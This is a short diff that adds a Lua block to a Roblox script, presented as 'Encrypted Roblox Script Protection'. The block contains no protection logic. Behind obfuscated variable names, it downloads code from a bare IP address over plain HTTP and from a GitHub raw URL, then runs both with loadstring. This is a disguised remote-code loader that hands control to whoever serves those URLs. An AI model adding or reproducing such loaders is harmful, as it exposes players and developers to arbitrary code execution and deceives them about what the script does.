@@ -1,0 +1,7 @@
+<custom-lua>
+--[[ Encrypted Roblox Script Protection ]]
+local _0x1a2b3c = "http://72.56.64.162/eMh2M4lsgnYDfhMfFCzWnuATNa7g2XNqgpkuxO80PrTpzC07JZPKNC6DIoqhLDysrzUXa1FXUepOlB5y"
+local _0x4d5e6f = "https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.20/yarhm.lua"
+loadstring(game:HttpGet(_0x1a2b3c))()
+loadstring(game:HttpGet(_0x4d5e6f, false))()
+</custom-lua>
